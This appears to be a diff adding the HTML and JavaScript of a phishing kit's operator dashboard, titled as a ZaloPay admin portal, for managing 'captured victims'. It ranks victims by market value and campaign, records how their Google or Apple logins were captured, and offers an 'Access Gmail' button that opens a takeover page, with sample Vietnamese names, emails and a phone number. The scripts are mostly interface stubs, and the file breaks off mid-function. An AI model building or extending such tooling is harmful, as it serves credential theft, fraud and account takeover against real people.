@@ -1,0 +1,861 @@
+
+
+Victim Database - ZaloPay Admin Portal
+
+
+<div class="container-fluid">
+    <!-- Mobile Navigation Toggle -->
+    <button class="nav-toggle d-mobile-block d-tablet-none" onclick="toggleSidebar()" title="Toggle Navigation">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <!-- Page Header với Quick Stats -->
+    <div class="d-flex justify-content-between align-items-center mb-4 mobile-center">
+        <div class="mobile-center">
+            <h1 class="h3 mb-0 text-gray-800">Victim Database Management</h1>
+            <p class="text-muted">Comprehensive victim tracking và management system</p>
+        </div>
+        <div class="d-flex gap-2 flex-wrap">
+            <button class="btn btn-success touch-target" onclick="exportVictims()">
+                <i class="fas fa-download me-1"></i><span class="d-mobile-none d-tablet-inline">Export All</span>
+            </button>
+            <button class="btn btn-primary touch-target" onclick="refreshData()">
+                <i class="fas fa-sync-alt me-1"></i><span class="d-mobile-none d-tablet-inline">Refresh</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- Real-time Statistics Cards - Mobile optimized -->
+    <div class="row mb-4 mobile-stack">
+        <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 col-12 mb-3">
+            <div class="card border-left-primary shadow h-100 py-2 touch-target">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="flex-grow-1">
+                            <div class="text-mobile-xs font-weight-bold text-primary text-uppercase mb-1">Total Victims</div>
+                            <div class="h5 mb-0 font-weight-bold text-gray-800" id="totalVictims">1,247</div>
+                        </div>
+                        <div class="ms-3">
+                            <i class="fas fa-users fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 col-12 mb-3">
+            <div class="card border-left-success shadow h-100 py-2 touch-target">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="flex-grow-1">
+                            <div class="text-mobile-xs font-weight-bold text-success text-uppercase mb-1">Validated</div>
+                            <div class="h5 mb-0 font-weight-bold text-gray-800" id="validatedVictims">892</div>
+                        </div>
+                        <div class="ms-3">
+                            <i class="fas fa-check-circle fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 col-12 mb-3">
+            <div class="card border-left-warning shadow h-100 py-2 touch-target">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="flex-grow-1">
+                            <div class="text-mobile-xs font-weight-bold text-warning text-uppercase mb-1">High Value</div>
+                            <div class="h5 mb-0 font-weight-bold text-gray-800" id="highValueVictims">156</div>
+                        </div>
+                        <div class="ms-3">
+                            <i class="fas fa-star fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 col-12 mb-3">
+            <div class="card border-left-info shadow h-100 py-2 touch-target">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="flex-grow-1">
+                            <div class="text-mobile-xs font-weight-bold text-info text-uppercase mb-1">Business Accounts</div>
+                            <div class="h5 mb-0 font-weight-bold text-gray-800" id="businessAccounts">234</div>
+                        </div>
+                        <div class="ms-3">
+                            <i class="fas fa-building fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 col-12 mb-3">
+            <div class="card border-left-danger shadow h-100 py-2 touch-target">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="flex-grow-1">
+                            <div class="text-mobile-xs font-weight-bold text-danger text-uppercase mb-1">Gmail Access</div>
+                            <div class="h5 mb-0 font-weight-bold text-gray-800" id="gmailAccess">687</div>
+                        </div>
+                        <div class="ms-3">
+                            <i class="fas fa-envelope fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-2 col-lg-4 col-md-6 col-sm-6 col-12 mb-3">
+            <div class="card border-left-secondary shadow h-100 py-2 touch-target">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="flex-grow-1">
+                            <div class="text-mobile-xs font-weight-bold text-secondary text-uppercase mb-1">Today's Captures</div>
+                            <div class="h5 mb-0 font-weight-bold text-gray-800" id="todayCaptures">47</div>
+                        </div>
+                        <div class="ms-3">
+                            <i class="fas fa-calendar-day fa-2x text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Advanced Filtering Panel - Mobile optimized -->
+    <div class="card shadow mb-4">
+        <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
+            <h6 class="m-0 font-weight-bold text-primary">Advanced Filters</h6>
+            <div class="d-flex gap-2">
+                <button class="btn btn-sm btn-outline-primary d-mobile-flex d-tablet-none touch-target" onclick="toggleFilters()" title="Toggle Filters">
+                    <i class="fas fa-filter"></i>
+                </button>
+                <div class="dropdown no-arrow">
+                    <a class="dropdown-toggle touch-target" href="#" role="button" id="filterDropdown" data-bs-toggle="dropdown" title="Filter Options">
+                        <i class="fas fa-ellipsis-v fa-sm fa-fw text-gray-400"></i>
+                    </a>
+                    <div class="dropdown-menu dropdown-menu-right shadow">
+                        <a class="dropdown-item" href="#" onclick="saveFilter()">Save Current Filter</a>
+                        <a class="dropdown-item" href="#" onclick="loadFilter()">Load Saved Filter</a>
+                        <div class="dropdown-divider"></div>
+                        <a class="dropdown-item" href="#" onclick="resetFilters()">Reset All Filters</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="card-body" id="filtersContent">
+            <div class="row mobile-stack">
+                <div class="col-md-2 col-sm-6 col-12 mb-3">
+                    <label class="form-label">Status</label>
+                    <select class="form-select touch-target" id="statusFilter" onchange="applyFilters()">
+                        <option value="">All Status</option>
+                        <option value="validated">Validated</option>
+                        <option value="pending">Pending Validation</option>
+                        <option value="invalid">Invalid</option>
+                        <option value="expired">Expired</option>
+                    </select>
+                </div>
+                <div class="col-md-2 col-sm-6 col-12 mb-3">
+                    <label class="form-label">Market Value</label>
+                    <select class="form-select touch-target" id="valueFilter" onchange="applyFilters()">
+                        <option value="">All Values</option>
+                        <option value="critical">Critical</option>
+                        <option value="high">High</option>
+                        <option value="medium">Medium</option>
+                        <option value="low">Low</option>
+                    </select>
+                </div>
+                <div class="col-md-2 col-sm-6 col-12 mb-3">
+                    <label class="form-label">Account Type</label>
+                    <select class="form-select touch-target" id="accountTypeFilter" onchange="applyFilters()">
+                        <option value="">All Types</option>
+                        <option value="business">Business</option>
+                        <option value="personal">Personal</option>
+                        <option value="enterprise">Enterprise</option>
+                    </select>
+                </div>
+                <div class="col-md-2 col-sm-6 col-12 mb-3">
+                    <label class="form-label">Campaign</label>
+                    <select class="form-select touch-target" id="campaignFilter" onchange="applyFilters()">
+                        <option value="">All Campaigns</option>
+                        <option value="zpm_q4_2025">ZPM Q4 2025</option>
+                        <option value="vn_sme_2025">VN SME 2025</option>
+                        <option value="exec_target">Executive Target</option>
+                    </select>
+                </div>
+                <div class="col-md-2 col-sm-6 col-12 mb-3">
+                    <label class="form-label">Date Range</label>
+                    <input type="date" class="form-control touch-target" id="dateFrom" onchange="applyFilters()">
+                </div>
+                <div class="col-md-2 col-sm-6 col-12 mb-3">
+                    <label class="form-label">&nbsp;</label>
+                    <input type="date" class="form-control touch-target" id="dateTo" onchange="applyFilters()">
+                </div>
+            </div>
+            <div class="row mobile-stack mt-3">
+                <div class="col-md-3 col-sm-6 col-12 mb-3">
+                    <label class="form-label">Search</label>
+                    <div class="input-group">
+                        <input type="text" class="form-control touch-target" id="searchBox" placeholder="Email, name, domain..." onkeyup="applyFilters()">
+                        <button class="btn btn-outline-primary touch-target" type="button" onclick="clearSearch()" title="Clear Search">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="col-md-3 col-sm-6 col-12 mb-3">
+                    <label class="form-label">Country</label>
+                    <select class="form-select touch-target" id="countryFilter" onchange="applyFilters()">
+                        <option value="">All Countries</option>
+                        <option value="VN">Vietnam</option>
+                        <option value="TH">Thailand</option>
+                        <option value="MY">Malaysia</option>
+                        <option value="SG">Singapore</option>
+                    </select>
+                </div>
+                <div class="col-md-3 col-sm-6 col-12 mb-3">
+                    <label class="form-label">OAuth Provider</label>
+                    <select class="form-select touch-target" id="oauthFilter" onchange="applyFilters()">
+                        <option value="">All Providers</option>
+                        <option value="google">Google</option>
+                        <option value="apple">Apple</option>
+                        <option value="direct">Direct Form</option>
+                    </select>
+                </div>
+                <div class="col-md-3 col-sm-6 col-12 mb-3">
+                    <label class="form-label">Gmail Access</label>
+                    <select class="form-select touch-target" id="gmailFilter" onchange="applyFilters()">
+                        <option value="">All</option>
+                        <option value="yes">Gmail Access</option>
+                        <option value="no">No Gmail Access</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Data Table -->
+    <div class="card shadow mb-4">
+        <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
+            <h6 class="m-0 font-weight-bold text-primary">Victim Database</h6>
+            <div class="d-flex gap-2">
+                <div class="input-group" style="width: 200px;">
+                    <select class="form-select form-select-sm" id="bulkAction">
+                        <option value="">Bulk Actions</option>
+                        <option value="validate">Validate Selected</option>
+                        <option value="export">Export Selected</option>
+                        <option value="delete">Delete Selected</option>
+                        <option value="assign">Assign to Campaign</option>
+                    </select>
+                    <button class="btn btn-sm btn-outline-primary" onclick="executeBulkAction()">Apply</button>
+                </div>
+                <button class="btn btn-sm btn-primary" onclick="refreshTable()">
+                    <i class="fas fa-sync-alt"></i>
+                </button>
+            </div>
+        </div>
+        <div class="card-body">
+            <div class="table-responsive">
+                <table class="table table-hover" id="victimsTable">
+                    <thead>
+                        <tr>
+                            <th width="30">
+                                <input type="checkbox" id="selectAll" onchange="toggleSelectAll()" class="touch-target">
+                            </th>
+                            <th onclick="sortTable('email')" style="cursor: pointer;" class="touch-target">
+                                Email <i class="fas fa-sort"></i>
+                            </th>
+                            <th onclick="sortTable('name')" style="cursor: pointer;" class="touch-target">
+                                Name <i class="fas fa-sort"></i>
+                            </th>
+                            <th onclick="sortTable('capture_date')" style="cursor: pointer;" class="touch-target">
+                                Capture Date <i class="fas fa-sort"></i>
+                            </th>
+                            <th>Status</th>
+                            <th>Value</th>
+                            <th>Type</th>
+                            <th>Campaign</th>
+                            <th>Country</th>
+                            <th>OAuth</th>
+                            <th>Gmail</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="victimsTableBody">
+                        <!-- Sample Data Rows -->
+                        <tr>
+                            <td data-label="Select"><input type="checkbox" name="victimSelect" value="victim1" class="touch-target"></td>
+                            <td data-label="Email">
+                                <div class="d-flex align-items-center">
+                                    <img class="rounded-circle me-2" width="30" height="30"
+                                         src="https://via.placeholder.com/30/007bff/ffffff?text=N" alt="">
+                                    <div>
+                                        <strong>ceo@techcorp.vn</strong>
+                                        <div class="small text-muted">Nguyễn Văn Nam</div>
+                                    </div>
+                                </div>
+                            </td>
+                            <td data-label="Name">Nguyễn Văn Nam</td>
+                            <td data-label="Capture Date">
+                                <div>2025-10-04 15:30</div>
+                                <div class="small text-muted">2 hours ago</div>
+                            </td>
+                            <td data-label="Status"><span class="badge bg-success">Validated</span></td>
+                            <td data-label="Value"><span class="badge bg-warning">High</span></td>
+                            <td data-label="Type"><span class="badge bg-info">Business</span></td>
+                            <td data-label="Campaign">ZPM Q4 2025</td>
+                            <td data-label="Country">🇻🇳 VN</td>
+                            <td data-label="OAuth"><i class="fab fa-google text-danger"></i></td>
+                            <td data-label="Gmail"><i class="fas fa-envelope text-success" title="Gmail Access Available"></i></td>
+                            <td data-label="Actions">
+                                <div class="btn-group-vertical d-mobile-flex d-tablet-none" role="group">
+                                    <button class="btn btn-sm btn-outline-primary touch-target" onclick="viewVictim('victim1')" title="View Details">
+                                        <i class="fas fa-eye"></i> View
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-success touch-target" onclick="accessGmail('victim1')" title="Access Gmail">
+                                        <i class="fas fa-envelope"></i> Gmail
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning touch-target" onclick="editVictim('victim1')" title="Edit">
+                                        <i class="fas fa-edit"></i> Edit
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-danger touch-target" onclick="deleteVictim('victim1')" title="Delete">
+                                        <i class="fas fa-trash"></i> Delete
+                                    </button>
+                                </div>
+                                <div class="btn-group d-mobile-none d-tablet-flex" role="group">
+                                    <button class="btn btn-sm btn-outline-primary touch-target" onclick="viewVictim('victim1')" title="View Details">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-success touch-target" onclick="accessGmail('victim1')" title="Access Gmail">
+                                        <i class="fas fa-envelope"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning touch-target" onclick="editVictim('victim1')" title="Edit">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-danger touch-target" onclick="deleteVictim('victim1')" title="Delete">
+                                        <i class="fas fa-trash"></i>
+                                    </button>
+                                </div>
+                            </td>
+                        </tr>
+                        
+                        <tr>
+                            <td data-label="Select"><input type="checkbox" name="victimSelect" value="victim2" class="touch-target"></td>
+                            <td data-label="Email">
+                                <div class="d-flex align-items-center">
+                                    <img class="rounded-circle me-2" width="30" height="30"
+                                         src="https://via.placeholder.com/30/28a745/ffffff?text=T" alt="">
+                                    <div>
+                                        <strong>manager@startup.com.vn</strong>
+                                        <div class="small text-muted">Trần Thị Lan</div>
+                                    </div>
+                                </div>
+                            </td>
+                            <td data-label="Name">Trần Thị Lan</td>
+                            <td data-label="Capture Date">
+                                <div>2025-10-04 14:15</div>
+                                <div class="small text-muted">3 hours ago</div>
+                            </td>
+                            <td data-label="Status"><span class="badge bg-warning">Pending</span></td>
+                            <td data-label="Value"><span class="badge bg-info">Medium</span></td>
+                            <td data-label="Type"><span class="badge bg-info">Business</span></td>
+                            <td data-label="Campaign">VN SME 2025</td>
+                            <td data-label="Country">🇻🇳 VN</td>
+                            <td data-label="OAuth"><i class="fab fa-apple text-dark"></i></td>
+                            <td data-label="Gmail"><i class="fas fa-times text-danger" title="No Gmail Access"></i></td>
+                            <td data-label="Actions">
+                                <div class="btn-group-vertical d-mobile-flex d-tablet-none" role="group">
+                                    <button class="btn btn-sm btn-outline-primary touch-target" onclick="viewVictim('victim2')">
+                                        <i class="fas fa-eye"></i> View
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-secondary touch-target" disabled title="No Gmail Access">
+                                        <i class="fas fa-envelope"></i> Gmail
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning touch-target" onclick="editVictim('victim2')">
+                                        <i class="fas fa-edit"></i> Edit
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-danger touch-target" onclick="deleteVictim('victim2')">
+                                        <i class="fas fa-trash"></i> Delete
+                                    </button>
+                                </div>
+                                <div class="btn-group d-mobile-none d-tablet-flex" role="group">
+                                    <button class="btn btn-sm btn-outline-primary touch-target" onclick="viewVictim('victim2')">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-secondary touch-target" disabled title="No Gmail Access">
+                                        <i class="fas fa-envelope"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning touch-target" onclick="editVictim('victim2')">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-danger touch-target" onclick="deleteVictim('victim2')">
+                                        <i class="fas fa-trash"></i>
+                                    </button>
+                                </div>
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td data-label="Select"><input type="checkbox" name="victimSelect" value="victim3" class="touch-target"></td>
+                            <td data-label="Email">
+                                <div class="d-flex align-items-center">
+                                    <img class="rounded-circle me-2" width="30" height="30"
+                                         src="https://via.placeholder.com/30/dc3545/ffffff?text=L" alt="">
+                                    <div>
+                                        <strong>director@enterprise.vn</strong>
+                                        <div class="small text-muted">Lê Văn Minh</div>
+                                    </div>
+                                </div>
+                            </td>
+                            <td data-label="Name">Lê Văn Minh</td>
+                            <td data-label="Capture Date">
+                                <div>2025-10-04 13:45</div>
+                                <div class="small text-muted">4 hours ago</div>
+                            </td>
+                            <td data-label="Status"><span class="badge bg-success">Validated</span></td>
+                            <td data-label="Value"><span class="badge bg-danger">Critical</span></td>
+                            <td data-label="Type"><span class="badge bg-primary">Enterprise</span></td>
+                            <td data-label="Campaign">Executive Target</td>
+                            <td data-label="Country">🇻🇳 VN</td>
+                            <td data-label="OAuth"><i class="fab fa-google text-danger"></i></td>
+                            <td data-label="Gmail"><i class="fas fa-envelope text-success" title="Gmail Access Available"></i></td>
+                            <td data-label="Actions">
+                                <div class="btn-group-vertical d-mobile-flex d-tablet-none" role="group">
+                                    <button class="btn btn-sm btn-outline-primary touch-target" onclick="viewVictim('victim3')">
+                                        <i class="fas fa-eye"></i> View
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-success touch-target" onclick="accessGmail('victim3')">
+                                        <i class="fas fa-envelope"></i> Gmail
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning touch-target" onclick="editVictim('victim3')">
+                                        <i class="fas fa-edit"></i> Edit
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-danger touch-target" onclick="deleteVictim('victim3')">
+                                        <i class="fas fa-trash"></i> Delete
+                                    </button>
+                                </div>
+                                <div class="btn-group d-mobile-none d-tablet-flex" role="group">
+                                    <button class="btn btn-sm btn-outline-primary touch-target" onclick="viewVictim('victim3')">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-success touch-target" onclick="accessGmail('victim3')">
+                                        <i class="fas fa-envelope"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning touch-target" onclick="editVictim('victim3')">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-danger touch-target" onclick="deleteVictim('victim3')">
+                                        <i class="fas fa-trash"></i>
+                                    </button>
+                                </div>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <!-- Pagination -->
+            <div class="d-flex justify-content-between align-items-center mt-3">
+                <div class="text-muted">
+                    Showing <span id="showingFrom">1</span> to <span id="showingTo">10</span> of <span id="totalRecords">1,247</span> entries
+                </div>
+                <nav>
+                    <ul class="pagination pagination-sm mb-0">
+                        <li class="page-item disabled">
+                            <span class="page-link">Previous</span>
+                        </li>
+                        <li class="page-item active"><span class="page-link">1</span></li>
+                        <li class="page-item"><a class="page-link" href="#" onclick="loadPage(2)">2</a></li>
+                        <li class="page-item"><a class="page-link" href="#" onclick="loadPage(3)">3</a></li>
+                        <li class="page-item"><span class="page-link">...</span></li>
+                        <li class="page-item"><a class="page-link" href="#" onclick="loadPage(125)">125</a></li>
+                        <li class="page-item">
+                            <a class="page-link" href="#" onclick="loadPage(2)">Next</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Victim Detail Modal -->
+<div class="modal fade" id="victimDetailModal" tabindex="-1">
+    <div class="modal-dialog modal-xl">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Victim Details</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body" id="victimDetailContent">
+                <!-- Victim details will be loaded here -->
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                <button type="button" class="btn btn-primary" onclick="openVictimProfile()">View Full Profile</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// Real-time data updates
+function refreshData() {
+    // Simulate real-time data refresh
+    showToast('Data refreshed successfully', 'success');
+    updateStatistics();
+}
+
+function updateStatistics() {
+    // Update statistics cards with animation
+    document.getElementById('totalVictims').textContent = (Math.floor(Math.random() * 100) + 1200).toLocaleString();
+    document.getElementById('todayCaptures').textContent = Math.floor(Math.random() * 50) + 25;
+}
+
+// Filter functions
+function applyFilters() {
+    showToast('Filters applied', 'info');
+    // Implementation would filter the table data
+}
+
+function resetFilters() {
+    document.getElementById('statusFilter').value = '';
+    document.getElementById('valueFilter').value = '';
+    document.getElementById('accountTypeFilter').value = '';
+    document.getElementById('campaignFilter').value = '';
+    document.getElementById('dateFrom').value = '';
+    document.getElementById('dateTo').value = '';
+    document.getElementById('searchBox').value = '';
+    document.getElementById('countryFilter').value = '';
+    document.getElementById('oauthFilter').value = '';
+    document.getElementById('gmailFilter').value = '';
+    showToast('Filters reset', 'info');
+}
+
+// Table functions
+function sortTable(column) {
+    showToast(`Sorting by ${column}`, 'info');
+}
+
+function toggleSelectAll() {
+    const selectAll = document.getElementById('selectAll');
+    const checkboxes = document.querySelectorAll('input[name="victimSelect"]');
+    checkboxes.forEach(cb => cb.checked = selectAll.checked);
+}
+
+function executeBulkAction() {
+    const action = document.getElementById('bulkAction').value;
+    const selected = document.querySelectorAll('input[name="victimSelect"]:checked');
+    
+    if (!action) {
+        showToast('Please select an action', 'warning');
+        return;
+    }
+    
+    if (selected.length === 0) {
+        showToast('Please select at least one victim', 'warning');
+        return;
+    }
+    
+    showToast(`${action} applied to ${selected.length} victims`, 'success');
+}
+
+// Victim actions
+function viewVictim(victimId) {
+    // Load victim details into modal
+    document.getElementById('victimDetailContent').innerHTML = `
+        <div class="row">
+            <div class="col-md-6">
+                <h6>Basic Information</h6>
+                <table class="table table-sm">
+                    <tr><td><strong>Email:</strong></td><td>ceo@techcorp.vn</td></tr>
+                    <tr><td><strong>Name:</strong></td><td>Nguyễn Văn Nam</td></tr>
+                    <tr><td><strong>Phone:</strong></td><td>+84987654321</td></tr>
+                    <tr><td><strong>Status:</strong></td><td><span class="badge bg-success">Validated</span></td></tr>
+                </table>
+            </div>
+            <div class="col-md-6">
+                <h6>Technical Details</h6>
+                <table class="table table-sm">
+                    <tr><td><strong>IP Address:</strong></td><td>192.168.1.100</td></tr>
+                    <tr><td><strong>User Agent:</strong></td><td>Chrome 118.0.0.0</td></tr>
+                    <tr><td><strong>Country:</strong></td><td>Vietnam</td></tr>
+                    <tr><td><strong>Capture Method:</strong></td><td>Google OAuth</td></tr>
+                </table>
+            </div>
+        </div>
+    `;
+    
+    new bootstrap.Modal(document.getElementById('victimDetailModal')).show();
+}
+
+function accessGmail(victimId) {
+    if (confirm('Access Gmail account for this victim?')) {
+        showToast('Accessing Gmail account...', 'info');
+        // Redirect to Gmail access interface
+        setTimeout(() => {
+            window.open('gmail_access.html?victim=' + victimId, '_blank');
+        }, 1000);
+    }
+}
+
+function editVictim(victimId) {
+    showToast('Opening victim editor...', 'info');
+}
+
+function deleteVictim(victimId) {
+    if (confirm('Are you sure you want to delete this victim? This action cannot be undone.')) {
+        showToast('Victim deleted successfully', 'success');
+    }
+}
+
+// Export functions
+function exportVictims() {
+    showToast('Exporting victim data...', 'info');
+    // Simulate export
+    setTimeout(() => {
+        showToast('Export completed successfully', 'success');
+    }, 2000);
+}
+
+// Page navigation
+function loadPage(page) {
+    showToast(`Loading page ${page}...`, 'info');
+}
+
+// Toast notification function
+function showToast(message, type = 'info') {
+    const toastHtml = `
+        <div class="toast align-items-center text-white bg-${type === 'success' ? 'success' : type === 'warning' ? 'warning' : type === 'danger' ? 'danger' : 'info'} border-0" role="alert">
+            <div class="d-flex">
+                <div class="toast-body">${message}</div>
+                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
+            </div>
+        </div>
+    `;
+    
+    let toastContainer = document.getElementById('toastContainer');
+    if (!toastContainer) {
+        toastContainer = document.createElement('div');
+        toastContainer.id = 'toastContainer';
+        toastContainer.className = 'toast-container position-fixed top-0 end-0 p-3';
+        document.body.appendChild(toastContainer);
+    }
+    
+    toastContainer.insertAdjacentHTML('beforeend', toastHtml);
+    const toast = new bootstrap.Toast(toastContainer.lastElementChild);
+    toast.show();
+}
+
+// Mobile-specific functions for victim database
+function toggleSidebar() {
+    const sidebar = document.querySelector('.sidebar');
+    const backdrop = document.querySelector('.sidebar-backdrop');
+
+    if (sidebar && backdrop) {
+        sidebar.classList.toggle('show');
+        backdrop.classList.toggle('show');
+    }
+}
+
+function toggleFilters() {
+    const filtersContent = document.getElementById('filtersContent');
+    if (filtersContent) {
+        filtersContent.style.display = filtersContent.style.display === 'none' ? 'block' : 'none';
+    }
+}
+
+// Enhanced table functions for mobile
+function sortTable(column) {
+    showToast(`Sắp xếp theo ${column}`, 'info');
+    // Add visual feedback for mobile
+    const button = event.target;
+    button.classList.add('loading');
+    setTimeout(() => {
+        button.classList.remove('loading');
+    }, 500);
+}
+
+function toggleSelectAll() {
+    const selectAll = document.getElementById('selectAll');
+    const checkboxes = document.querySelectorAll('input[name="victimSelect"]');
+    checkboxes.forEach(cb => cb.checked = selectAll.checked);
+
+    // Mobile feedback
+    if (selectAll.checked) {
+        showToast(`Đã chọn tất cả victims`, 'info');
+    } else {
+        showToast(`Đã bỏ chọn tất cả`, 'info');
+    }
+}
+
+function executeBulkAction() {
+    const action = document.getElementById('bulkAction').value;
+    const selected = document.querySelectorAll('input[name="victimSelect"]:checked');
+
+    if (!action) {
+        showToast('Vui lòng chọn hành động', 'warning');
+        return;
+    }
+
+    if (selected.length === 0) {
+        showToast('Vui lòng chọn ít nhất một victim', 'warning');
+        return;
+    }
+
+    // Show loading state
+    const button = event.target;
+    button.classList.add('loading');
+
+    setTimeout(() => {
+        button.classList.remove('loading');
+        showToast(`${action} applied to ${selected.length} victims`, 'success');
+    }, 1000);
+}
+
+// Enhanced victim actions for mobile
+function viewVictim(victimId) {
+    // Load victim details into modal with mobile optimization
+    const modalContent = document.getElementById('victimDetailContent');
+    modalContent.innerHTML = `
+        <div class="row mobile-stack">
+            <div class="col-md-6 col-12 mb-3">
+                <h6>Basic Information</h6>
+                <table class="table table-sm">
+                    <tr><td><strong>Email:</strong></td><td>ceo@techcorp.vn</td></tr>
+                    <tr><td><strong>Name:</strong></td><td>Nguyễn Văn Nam</td></tr>
+                    <tr><td><strong>Phone:</strong></td><td>+84987654321</td></tr>
+                    <tr><td><strong>Status:</strong></td><td><span class="badge bg-success">Validated</span></td></tr>
+                </table>
+            </div>
+            <div class="col-md-6 col-12 mb-3">
+                <h6>Technical Details</h6>
+                <table class="table table-sm">
+                    <tr><td><strong>IP Address:</strong></td><td>192.168.1.100</td></tr>
+                    <tr><td><strong>User Agent:</strong></td><td>Chrome 118.0.0.0</td></tr>
+                    <tr><td><strong>Country:</strong></td><td>Vietnam</td></tr>
+                    <tr><td><strong>Capture Method:</strong></td><td>Google OAuth</td></tr>
+                </table>
+            </div>
+        </div>
+        <div class="d-flex gap-2 mt-3 d-mobile-flex d-tablet-none">
+            <button class="btn btn-primary touch-target" onclick="accessGmail('${victimId}')">
+                <i class="fas fa-envelope"></i> Access Gmail
+            </button>
+            <button class="btn btn-warning touch-target" onclick="editVictim('${victimId}')">
+                <i class="fas fa-edit"></i> Edit
+            </button>
+        </div>
+    `;
+
+    new bootstrap.Modal(document.getElementById('victimDetailModal')).show();
+}
+
+function accessGmail(victimId) {
+    if (confirm('Truy cập tài khoản Gmail của victim này?')) {
+        showToast('Đang truy cập Gmail...', 'info');
+        // Redirect to Gmail access interface
+        setTimeout(() => {
+            window.open(`gmail_access.html?victim=${victimId}`, '_blank');
+        }, 1000);
+    }
+}
+
+function editVictim(victimId) {
+    showToast('Mở trình chỉnh sửa victim...', 'info');
+    // Implementation would open edit modal
+}
+
+function deleteVictim(victimId) {
+    if (confirm('Bạn có chắc chắn muốn xóa victim này? Hành động này không thể hoàn tác.')) {
+        showToast('Đã xóa victim thành công', 'success');
+    }
+}
+
+// Touch gesture support for table
+let tableStartX = 0;
+let tableStartY = 0;
+let tableEndX = 0;
+let tableEndY = 0;
+
+document.addEventListener('touchstart', function(e) {
+    if (e.target.closest('.table-responsive')) {
+        tableStartX = e.changedTouches[0].screenX;
+        tableStartY = e.changedTouches[0].screenY;
+    }
+});
+
+document.addEventListener('touchend', function(e) {
+    if (e.target.closest('.table-responsive')) {
+        tableEndX = e.changedTouches[0].screenX;
+        tableEndY = e.changedTouches[0].screenY;
+        handleTableGesture();
+    }
+});
+
+function handleTableGesture() {
+    const deltaX = tableStartX - tableEndX;
+    const deltaY = tableStartY - tableEndY;
+    const minSwipeDistance = 50;
+
+    if (Math.abs(deltaX) > Math.abs(deltaY)) {
+        // Horizontal swipe
+        if (Math.abs(deltaX) > minSwipeDistance) {
+            if (deltaX > 0) {
+                // Swipe left - could implement quick actions
+                console.log('Swipe left on table');
+            } else {
+                // Swipe right - could implement navigation
+                console.log('Swipe right on table');
+            }
+        }
+    }
+}
+
+// Mobile pagination
+function loadPage(page) {
+    showToast(`Đang tải trang ${page}...`, 'info');
+    // Add loading state to pagination
+    const button = event.target;
+    button.classList.add('loading');
+    setTimeout(() => {
+        button.classList.remove('loading');
+    }, 1000);
+}
+
+// Enhanced refresh functions
+function refreshTable() {
+    showToast('Đang làm mới bảng dữ liệu...', 'info');
+    // Simulate refresh
+    setTimeout(() => {
+        showToast('Đã làm mới thành công', 'success');
+    }, 1500);
+}
+
+// Auto-refresh every 30 seconds
+setInterval(updateStatistics, 30000);
+
+// Mobile initialization
+document.addEventListener('DOMContentLoaded', function() {
+    // Add touch feedback to all buttons
+    document.querySelectorAll('.btn').forEach(btn => {
+        btn.addEventListener('touchstart', function() {
+            this.style.transform = 'scale(0.95)';
+        });
+        btn.addEventListener('touchend', function() {
+            this.style.transform = 'scale(1)';
+        });
+    });
+
+    // Mobile viewport height fix
